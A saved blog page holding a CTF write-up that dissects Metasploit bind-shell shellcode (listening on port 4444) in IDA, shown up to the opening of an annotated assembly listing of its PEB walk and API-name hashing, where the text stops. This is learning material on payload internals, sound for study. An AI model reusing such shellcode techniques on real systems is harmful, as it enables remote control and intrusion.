<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<!-- saved from url=(0045)http://www.programlife.net/shellcode-diy.html -->
<html  xmlns="http://www.w3.org/1999/xhtml"  style="height: 100%;"><head  profile="http://gmpg.org/xfn/11"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<meta  http-equiv="X-UA-Compatible"  content="IE=EmulateIE7">
	
	<meta  name="copyright"  content="Www.ProgramLife.Net">
	<meta  name="author"  content="代码疯子">
	
	<title>[XDCTF]Shellcode DIY _ 程序人生</title>
	
	<link  rel="alternate"  type="application/rss+xml"  title="RSS 2.0 - 所有文章"  href="http://www.programlife.net/feed">
	<link  rel="alternate"  type="application/rss+xml"  title="RSS 2.0 - 所有评论"  href="http://www.programlife.net/comments/feed">
	<link  rel="pingback"  href="http://www.programlife.net/xmlrpc.php">

	
	
	<style  type="text/css"  media="screen">@import url( http://www.programlife.net/wp-content/themes/inove/style.css );</style>
	
			<link  rel="stylesheet"  href="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/chinese.css"  type="text/css"  media="screen">
		
	

	
	<script  type="text/javascript"  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/base.js"></script><style  type="text/css"></style>
	<script  type="text/javascript"  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/menu.js"></script>
	

	<link  rel="alternate"  type="application/rss+xml"  title="程序人生 » [XDCTF]Shellcode DIY评论Feed"  href="http://www.programlife.net/shellcode-diy.html/feed">
<link  rel="stylesheet"  id="wp-syntax-css-css"  href="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/wp-syntax.css"  type="text/css"  media="all">
<link  rel="stylesheet"  id="wp-pagenavi-css"  href="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/pagenavi-css.css"  type="text/css"  media="all">
<link  rel="EditURI"  type="application/rsd+xml"  title="RSD"  href="http://www.programlife.net/xmlrpc.php?rsd">
<link  rel="wlwmanifest"  type="application/wlwmanifest+xml"  href="http://www.programlife.net/wp-includes/wlwmanifest.xml"> 
<link  rel="prev"  title="C++单例模式Singleton内存回收"  href="http://www.programlife.net/cpp-singleton-memory-retrieve.html">
<link  rel="next"  title="CMD批处理执行多个命令"  href="http://www.programlife.net/cmd-multi-commands.html">
<meta  name="generator"  content="WordPress 3.6">
<link  rel="shortlink"  href="http://www.programlife.net/?p=2841">
	<style  type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>


<meta  name="description"  content="XDCTF(西电CTF)溢出部分有一个编写Shellcode的题目，要求ShellCode运行后能够监听4444端口，并且能够执行从控制端传输过来的其他ShellCode。现成的当然是没有的，全部自己写对于我等菜鸟来说那肯定不太可信吧，我的思路是从Metasploit找一个过来DIY一下。">

<meta  name="keywords"  content="metasploit,shellcode,xdctf,恶意代码">

<link  rel="canonical"  href="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生.htm">


<style  type="text/css"  media="screen">
.editComment, .editableComment, .textComment{
	display: inline;
}
.comment-childs{
	border: 1px solid #999;
	margin: 5px 2px 2px 4px;
	padding: 4px 2px 2px 4px;
	background-color: white;
}
.chalt{
	background-color: #E2E2E2;
}
#newcomment{
	border:1px dashed #777;width:90%;
}
#newcommentsubmit{
	color:red;
}
.adminreplycomment{
	border:1px dashed #777;
	width:99%;
	margin:4px;
	padding:4px;
}
.mvccls{
	color: #999;
}
			
</style>
<link  href="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/bdsstyle.css"  rel="stylesheet"  type="text/css"><link  type="text/css"  rel="stylesheet"  charset="UTF-8"  href="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/translateelement.css"><script  type="text/javascript"  charset="UTF-8"  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/main_zh-CN.js"></script><script  type="text/javascript"  charset="UTF-8"  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/element_main.js"></script><script  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/logger.js"></script></head>


<body  style="position: relative; min-height: 100%; top: 0px;"><iframe  frameborder="0"  style="display: none;"></iframe><div  id="bdshare_s"  style="display: block;"><iframe  id="bdsIfr"  style="position:absolute;display:none;z-index:9999;"  frameborder="0"></iframe><div  id="bdshare_l"  style="display: none;"><div  id="bdshare_l_c"><h6>分享到</h6><ul><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_mshare mshare">一键分享</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_qzone qqkj">QQ空间</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_tsina xlwb">新浪微博</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_baidu bdsc">百度云收藏</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_renren rrw">人人网</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_tqq txwb">腾讯微博</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_bdxc bdxc">百度相册</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_kaixin001 kxw">开心网</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_tqf txpy">腾讯朋友</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_tieba bdtb">百度贴吧</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_douban db">豆瓣网</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_tsohu shwb">搜狐微博</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_bdhome bdhome">百度新首页</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_sqq sqq">QQ好友</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_thx thx">和讯微博</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_more">更多...</a></li></ul><p><a  href="http://www.programlife.net/shellcode-diy.html#"  class="goWebsite">百度分享</a></p></div></div></div><div  id="bdshare_s"  style="display: block;"><iframe  id="bdsIfr"  style="position:absolute;display:none;z-index:9999;"  frameborder="0"></iframe><div  id="bdshare_l"  style="display: none;"><div  id="bdshare_l_c"><h6>分享到</h6><ul><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_mshare mshare">一键分享</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_qzone qqkj">QQ空间</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_tsina xlwb">新浪微博</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_baidu bdsc">百度云收藏</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_renren rrw">人人网</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_tqq txwb">腾讯微博</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_bdxc bdxc">百度相册</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_kaixin001 kxw">开心网</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_tqf txpy">腾讯朋友</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_tieba bdtb">百度贴吧</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_douban db">豆瓣网</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_tsohu shwb">搜狐微博</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_bdhome bdhome">百度新首页</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_sqq sqq">QQ好友</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_thx thx">和讯微博</a></li><li><a  href="http://www.programlife.net/shellcode-diy.html#"  class="bds_more">更多...</a></li></ul><p><a  href="http://www.programlife.net/shellcode-diy.html#"  class="goWebsite">百度分享</a></p></div></div></div>

<div  id="wrap">


<div  id="container">



<div  id="header">



	

	
	



	<div  id="caption">

		<h1  id="title"><a  href="http://www.programlife.net/">程序人生</a></h1>

		<div  id="tagline">代码疯子的技术博客——记录我的技术成长过程[C++ / Python]</div>

	</div>



	<div  class="fixed"></div>

</div>







<div  id="navigation">

	

	<ul  id="menus">

		<li  class="page_item"><a  class="home"  title="首页"  href="http://www.programlife.net/">首页</a></li>

			<li  class="cat-item cat-item-308"><a  href="http://www.programlife.net/category/acmicpc"  title="查看ACM-ICPC下的所有文章">ACM-ICPC</a><ul  class="children"  style="visibility: hidden; display: block;"><li  class="cat-item cat-item-629"><a  href="http://www.programlife.net/category/acmicpc/easyacm"  title="很简单的ACM题目">ACM水题</a>
</li><li  class="cat-item cat-item-354"><a  href="http://www.programlife.net/category/acmicpc/hdoj"  title="HDOJ解题报告">HDOJ解题报告</a>
</li><li  class="cat-item cat-item-268"><a  href="http://www.programlife.net/category/acmicpc/poj"  title="POJ解题报告">POJ解题报告</a>
</li><li  class="cat-item cat-item-317"><a  href="http://www.programlife.net/category/acmicpc/usaco"  title="USACO题解">USACO题解</a>
</li><li  class="cat-item cat-item-359"><a  href="http://www.programlife.net/category/acmicpc/otherproblems"  title="其他OJ的一些题目"  class=" last">其他题解</a>
</li></ul></li>
	<li  class="cat-item cat-item-355"><a  href="http://www.programlife.net/category/cppdev"  title="C++开发">C/C++</a><ul  class="children"  style="visibility: hidden; display: block;"><li  class="cat-item cat-item-674"><a  href="http://www.programlife.net/category/cppdev/boost"  title="学习使用Boost编程">Boost编程</a>
</li><li  class="cat-item cat-item-4"><a  href="http://www.programlife.net/category/cppdev/cpp"  title="C++基础">C++编程</a>
</li><li  class="cat-item cat-item-5"><a  href="http://www.programlife.net/category/cppdev/c"  title="C语言的一些细节">C语言</a>
</li><li  class="cat-item cat-item-6"><a  href="http://www.programlife.net/category/cppdev/stl"  title="循序渐进学习STL"  class=" last">STL编程</a>
</li></ul></li>
	<li  class="cat-item cat-item-889"><a  href="http://www.programlife.net/category/linuxdev"  title="Linux/Android相关学习（开发、逆向、安全）">Linux开发</a><ul  class="children"  style="visibility: hidden; display: block;"><li  class="cat-item cat-item-890"><a  href="http://www.programlife.net/category/linuxdev/androidsec"  title="Android软件安全与逆向分析">Android软件安全</a>
</li><li  class="cat-item cat-item-883"><a  href="http://www.programlife.net/category/linuxdev/linuxsec"  title="学习Linux安全"  class=" last">Linux安全</a>
</li></ul></li>
	<li  class="cat-item cat-item-357"><a  href="http://www.programlife.net/category/web"  title="Web相关杂项">Web</a><ul  class="children"  style="visibility: hidden; display: block;"><li  class="cat-item cat-item-19"><a  href="http://www.programlife.net/category/web/protoana"  title="协议分析">HTTP协议</a>
</li><li  class="cat-item cat-item-613"><a  href="http://www.programlife.net/category/web/pythonprogram"  title="查看Python编程下的所有文章">Python编程</a>
</li><li  class="cat-item cat-item-108"><a  href="http://www.programlife.net/category/web/ubuntu"  title="查看Ubuntu下的所有文章">Ubuntu</a>
</li><li  class="cat-item cat-item-566"><a  href="http://www.programlife.net/category/web/websec"  title="查看Web安全下的所有文章">Web安全</a>
</li><li  class="cat-item cat-item-11"><a  href="http://www.programlife.net/category/web/wp"  title="WordPress建站"  class=" last">WordPress</a>
</li></ul></li>
	<li  class="cat-item cat-item-356"><a  href="http://www.programlife.net/category/windev"  title="Windows程序设计">Windows开发</a><ul  class="children"  style="visibility: hidden; display: block;"><li  class="cat-item cat-item-879"><a  href="http://www.programlife.net/category/windev/chrome-windev"  title="Chrome源码阅读 / Chrome源码学习笔记">Chrome源码学习</a>
</li><li  class="cat-item cat-item-430"><a  href="http://www.programlife.net/category/windev/mfcdev"  title="查看MFC编程下的所有文章"  class=" subtitle">MFC编程</a><ul  class="children"  style="visibility: hidden; display: block;"><li  class="cat-item cat-item-737"><a  href="http://www.programlife.net/category/windev/mfcdev/dissecting-mfc"  title="《深入浅出MFC》读书笔记"  class=" last">深入浅出MFC</a>
</li></ul></li><li  class="cat-item cat-item-496"><a  href="http://www.programlife.net/category/windev/pe-coff-format"  title="查看PE文件格式下的所有文章">PE文件格式</a>
</li><li  class="cat-item cat-item-9"><a  href="http://www.programlife.net/category/windev/asm"  title="Win32Asm学习">Win32 ASM</a>
</li><li  class="cat-item cat-item-7"><a  href="http://www.programlife.net/category/windev/winsdk"  title="Win32 API编程">Windows SDK</a>
</li><li  class="cat-item cat-item-235"><a  href="http://www.programlife.net/category/windev/winwdk"  title="驱动开发">Windows驱动开发</a>
</li><li  class="cat-item cat-item-439"><a  href="http://www.programlife.net/category/windev/asm-kernel"  title="查看天书夜读下的所有文章">天书夜读</a>
</li><li  class="cat-item cat-item-796"><a  href="http://www.programlife.net/category/windev/malware-windev"  title="恶意代码研究、学习、对抗">恶意代码</a>
</li><li  class="cat-item cat-item-580"><a  href="http://www.programlife.net/category/windev/exploit"  title="缓冲区溢出攻击与防范">缓冲区溢出</a>
</li><li  class="cat-item cat-item-502"><a  href="http://www.programlife.net/category/windev/reverse-debug"  title="查看逆向调试下的所有文章"  class=" last subtitle">逆向调试</a><ul  class="children"  style="visibility: hidden; display: block;"><li  class="cat-item cat-item-699"><a  href="http://www.programlife.net/category/windev/reverse-debug/av"  title="免杀学习——知己知彼百战百胜，AntiVirus"  class=" last">免杀</a>
</li></ul></li></ul></li>
	<li  class="cat-item cat-item-656"><a  href="http://www.programlife.net/category/jobhunt"  title="求职招聘相关话题">求职招聘</a><ul  class="children"  style="visibility: hidden; display: block;"><li  class="cat-item cat-item-652"><a  href="http://www.programlife.net/category/jobhunt/bole"  title="求职招聘内部推荐">招聘推荐</a>
</li><li  class="cat-item cat-item-514"><a  href="http://www.programlife.net/category/jobhunt/interviewexperience"  title="笔试经验与面试经验"  class=" last">笔经面经</a>
</li></ul></li>
	<li  class="cat-item cat-item-32"><a  href="http://www.programlife.net/category/others"  title="新闻资讯,杂七杂八等"  class=" ">谈天说地</a><ul  class="children"  style="visibility: hidden; display: block; left: 680px; top: 152px;"><li  class="cat-item cat-item-1"><a  href="http://www.programlife.net/category/others/abouts"  title="一些文字">发展历程</a>
</li><li  class="cat-item cat-item-731"><a  href="http://www.programlife.net/category/others/plan"  title="我的计划我做主，Since 2012-01-04">学习规划</a>
</li><li  class="cat-item cat-item-361"><a  href="http://www.programlife.net/category/others/news"  title="业界新闻资讯">新闻资讯</a>
</li><li  class="cat-item cat-item-362"><a  href="http://www.programlife.net/category/others/someskills"  title="各种扯淡，各种自言自语"  class=" last">疯言疯语</a>
</li></ul></li>
	<li  class="cat-item cat-item-513"><a  href="http://www.programlife.net/category/engineering"  title="软件工程 - Software Engineering">软件工程</a><ul  class="children"  style="visibility: hidden; display: block;"><li  class="cat-item cat-item-516"><a  href="http://www.programlife.net/category/engineering/itculture"  title="查看IT文化下的所有文章">IT文化</a>
</li><li  class="cat-item cat-item-515"><a  href="http://www.programlife.net/category/engineering/designpattern"  title="查看设计模式下的所有文章">设计模式</a>
</li><li  class="cat-item cat-item-684"><a  href="http://www.programlife.net/category/engineering/softwarerelease"  title="个人原创作品、汉化作品、DIY作品发布">软件发布</a>
</li><li  class="cat-item cat-item-705"><a  href="http://www.programlife.net/category/engineering/pm"  title="工作经验杂谈，扯淡，吹水"  class=" last">项目管理</a>
</li></ul></li>
<li  class="page_item page-item-1786"><a  href="http://www.programlife.net/report"><span  style="color: #FF0000;">安全报表</span></a></li>
<li  class="page_item page-item-1819"><a  href="http://www.programlife.net/links">友情链接</a></li>
<li  class="page_item page-item-1850"><a  href="http://www.programlife.net/googlesearch">站内搜索</a></li>
<li  class="page_item page-item-2"><a  href="http://www.programlife.net/about">关于</a></li>

		<li><a  class="lastmenu"  href="javascript:void(0);"></a></li>

	</ul>

	



	<div  class="fixed"></div>

</div>





<div  id="content">

	
	<div  id="main">


	<div  id="postpath">
		<a  title="转到首页"  href="http://www.programlife.net/">首页</a>
		 &gt; <a  href="http://www.programlife.net/category/windev/malware-windev"  title="查看恶意代码中的全部文章"  rel="category tag">恶意代码</a>		 &gt; [XDCTF]Shellcode DIY	</div>

	<div  class="post"  id="post-2841">
		<h2>[XDCTF]Shellcode DIY</h2>
		<div  class="info">
			<span  class="date">2013年10月7日</span>
			<span  class="author"><a  href="http://www.programlife.net/author/admin"  title="由代码疯子发布"  rel="author">代码疯子</a></span>										<span  class="addcomment"><a  href="http://www.programlife.net/shellcode-diy.html#respond">发表评论</a></span>
				<span  class="comments"><a  href="http://www.programlife.net/shellcode-diy.html#comments">阅读评论</a></span>
						<div  class="fixed"></div>
		</div>
		<div  class="content">	
			<p>国庆参加了XDCTF，被虐的相当惨，不过时间安排确实不怎么好，时间安排在前六天，先提交且通过的得分高，越往后交分数越低，偏偏还要搞在1号0:00开始，相当的操蛋的安排。另外就是这是组队赛，大家很难把假期全部贡献在比赛上，以至于很多题目都没时间做了。不过玩玩就好，参加一下总是涨了点知识，写点笔记。（这次比赛许多大牛都出来厮杀了，场面相当激烈）</p>
<p>溢出部分有一个编写Shellcode的题目，要求ShellCode运行后能够监听4444端口，并且能够执行从控制端传输过来的其他ShellCode。现成的当然是没有的，全部自己写对于我等菜鸟来说那肯定不太可信吧，我的思路是找一个过来DIY一下。</p>
<p>首先，去Metasploit找一个框架过来吧：就拿一个tcp bind shell，端口设置为4444，将ShellCode导出为C语言的数组格式，然后稍微处理一下转成二进制文件（使用Notepad++去除其中的\x、引号以及换行符，然后转大写即可，然后使用C32Asm的特别粘贴功能，保存即可得到二进制文件），接着使用IDA分析一下这段ShellCode。</p>
<p>ShellCode的入口是这样的：</p>

<div  class="wp_syntax"><table><tbody><tr><td  class="code"><pre  class="asm"  style="font-family:monospace;"><span  style="color: #666666; font-style: normal;">;=========================================================</span>
<span  style="color: #666666; font-style: normal;">; start</span>
<span  style="color: #666666; font-style: normal;">;=========================================================</span>
<span  style="color: #0000ff; font-weight: normal;">start</span><span  style="color: #339933;">:</span>
    <span  style="color: #00007f; font-weight: normal;">cld</span>
    <span  style="color: #00007f; font-weight: normal;">call</span>    kMainFun        <span  style="color: #666666; font-style: normal;">; 主要逻辑代码函数</span>
<span  style="color: #666666; font-style: normal;">;=========================================================</span>
<span  style="color: #666666; font-style: normal;">; 函数调用包装函数</span>
<span  style="color: #666666; font-style: normal;">; 传入参数为待调用函数的参数以及函数名HASH值</span>
<span  style="color: #666666; font-style: normal;">;=========================================================</span>
<span  style="color: #666666; font-style: normal;">;fnFunctionCaller proc</span>
	assume <span  style="color: #46aa03; font-weight: normal;">fs</span><span  style="color: #339933;">:</span>nothing
    <span  style="color: #00007f; font-weight: normal;">pusha</span>                   <span  style="color: #666666; font-style: normal;">; 保存所有寄存器</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">ebp</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">esp</span>        <span  style="color: #666666; font-style: normal;">; 建立新栈帧</span>
    <span  style="color: #00007f; font-weight: normal;">xor</span>     <span  style="color: #46aa03; font-weight: normal;">edx</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">edx</span>        <span  style="color: #666666; font-style: normal;">; EDX寄存器清零操作</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">edx</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">fs</span><span  style="color: #339933;">:</span><span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">edx</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">30h</span><span  style="color: #009900; font-weight: bold;">]</span> <span  style="color: #666666; font-style: normal;">; PEB</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">edx</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">edx</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">0Ch</span><span  style="color: #009900; font-weight: bold;">]</span>  <span  style="color: #666666; font-style: normal;">; PEB_LDR_DATA</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">edx</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">edx</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">14h</span><span  style="color: #009900; font-weight: bold;">]</span>  <span  style="color: #666666; font-style: normal;">; InMemoryOrderModuleList</span>
&nbsp;
loc_15<span  style="color: #339933;">:</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">esi</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">edx</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">28h</span><span  style="color: #009900; font-weight: bold;">]</span>  <span  style="color: #666666; font-style: normal;">; BaseDllName(DLL名字)</span>
    <span  style="color: #00007f; font-weight: normal;">movzx</span>   <span  style="color: #46aa03; font-weight: normal;">ecx</span><span  style="color: #339933;">,</span> <span  style="color: #0000ff; font-weight: normal;">word</span> ptr <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">edx</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">26h</span><span  style="color: #009900; font-weight: bold;">]</span> <span  style="color: #666666; font-style: normal;">; (DllName长度+1)*2 即(UNICODE_STRING的长度字段)</span>
    <span  style="color: #00007f; font-weight: normal;">xor</span>     <span  style="color: #46aa03; font-weight: normal;">edi</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">edi</span>        <span  style="color: #666666; font-style: normal;">; EDI寄存器清零</span>
&nbsp;
    <span  style="color: #666666; font-style: normal;">; ==== 计算DLL名字HASH值 ====</span>
loc_1E<span  style="color: #339933;">:</span>
    <span  style="color: #00007f; font-weight: normal;">xor</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">eax</span>        <span  style="color: #666666; font-style: normal;">; EAX寄存器清零</span>
    <span  style="color: #00007f; font-weight: normal;">lodsb</span>                   <span  style="color: #666666; font-style: normal;">; 取DllName第一个字符</span>
    <span  style="color: #00007f; font-weight: normal;">cmp</span>     <span  style="color: #46aa03; font-weight: normal;">al</span><span  style="color: #339933;">,</span> <span  style="color: #ff0000;">61h</span> <span  style="color: #666666; font-style: normal;">; 'a'</span>
    <span  style="color: #00007f; font-weight: normal;">jl</span>      short loc_27    <span  style="color: #666666; font-style: normal;">; 小于'a'时跳转</span>
    <span  style="color: #00007f; font-weight: normal;">sub</span>     <span  style="color: #46aa03; font-weight: normal;">al</span><span  style="color: #339933;">,</span> <span  style="color: #ff0000;">20h</span> <span  style="color: #666666; font-style: normal;">; ' '   ; 转大写字母</span>
&nbsp;
loc_27<span  style="color: #339933;">:</span>
    <span  style="color: #00007f; font-weight: normal;">ror</span>     <span  style="color: #46aa03; font-weight: normal;">edi</span><span  style="color: #339933;">,</span> <span  style="color: #ff0000;">0Dh</span>        <span  style="color: #666666; font-style: normal;">; 移位</span>
    <span  style="color: #00007f; font-weight: normal;">add</span>     <span  style="color: #46aa03; font-weight: normal;">edi</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">eax</span>        <span  style="color: #666666; font-style: normal;">; 累加</span>
    <span  style="color: #00007f; font-weight: normal;">loop</span>    loc_1E          <span  style="color: #666666; font-style: normal;">; 循环计算DllName哈希值</span>
&nbsp;
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">edx</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">edi</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">edx</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">edx</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">10h</span><span  style="color: #009900; font-weight: bold;">]</span>  <span  style="color: #666666; font-style: normal;">; DllBase Dll基地址</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">edx</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">3Ch</span><span  style="color: #009900; font-weight: bold;">]</span>  <span  style="color: #666666; font-style: normal;">; 开始解析PE文件格式</span>
    <span  style="color: #00007f; font-weight: normal;">add</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">edx</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">78h</span><span  style="color: #009900; font-weight: bold;">]</span>  <span  style="color: #666666; font-style: normal;">; 数据目录表输出表结构</span>
    <span  style="color: #00007f; font-weight: normal;">test</span>    <span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">jz</span>      short loc_89    <span  style="color: #666666; font-style: normal;">; 没有输出表, 跳转到返回</span>
    <span  style="color: #00007f; font-weight: normal;">add</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">edx</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">ecx</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">18h</span><span  style="color: #009900; font-weight: bold;">]</span>  <span  style="color: #666666; font-style: normal;">; 总的导出函数个数</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">ebx</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">20h</span><span  style="color: #009900; font-weight: bold;">]</span>
    <span  style="color: #00007f; font-weight: normal;">add</span>     <span  style="color: #46aa03; font-weight: normal;">ebx</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">edx</span>
&nbsp;
loc_4A<span  style="color: #339933;">:</span>
    <span  style="color: #00007f; font-weight: normal;">jecxz</span>   short loc_88
    <span  style="color: #00007f; font-weight: normal;">dec</span>     <span  style="color: #46aa03; font-weight: normal;">ecx</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">esi</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">ebx</span><span  style="color: #339933;">+</span><span  style="color: #46aa03; font-weight: normal;">ecx</span><span  style="color: #339933;">*</span><span  style="color: #ff0000;">4</span><span  style="color: #009900; font-weight: bold;">]</span> <span  style="color: #666666; font-style: normal;">; 函数名字</span>
    <span  style="color: #00007f; font-weight: normal;">add</span>     <span  style="color: #46aa03; font-weight: normal;">esi</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">edx</span>
    <span  style="color: #00007f; font-weight: normal;">xor</span>     <span  style="color: #46aa03; font-weight: normal;">edi</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">edi</span>
&nbsp;
    <span  style="color: #666666; font-style: normal;">; ==== 计算函数名字HASH值 ====</span>
loc_54<span  style="color: #339933;">:</span>
    <span  style="color: #00007f; font-weight: normal;">xor</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">lodsb</span>
    <span  style="color: #00007f; font-weight: normal;">ror</span>     <span  style="color: #46aa03; font-weight: normal;">edi</span><span  style="color: #339933;">,</span> <span  style="color: #ff0000;">0Dh</span>
    <span  style="color: #00007f; font-weight: normal;">add</span>     <span  style="color: #46aa03; font-weight: normal;">edi</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">cmp</span>     <span  style="color: #46aa03; font-weight: normal;">al</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">ah</span>
    <span  style="color: #00007f; font-weight: normal;">jnz</span>     short loc_54    <span  style="color: #666666; font-style: normal;">; 循环计算函数名HASH值</span>
    <span  style="color: #00007f; font-weight: normal;">add</span>     <span  style="color: #46aa03; font-weight: normal;">edi</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">ebp</span><span  style="color: #339933;">-</span><span  style="color: #ff0000;">8</span><span  style="color: #009900; font-weight: bold;">]</span>    <span  style="color: #666666; font-style: normal;">; ==== Hash1(DllName) + Hash2(ApiName) ====</span>
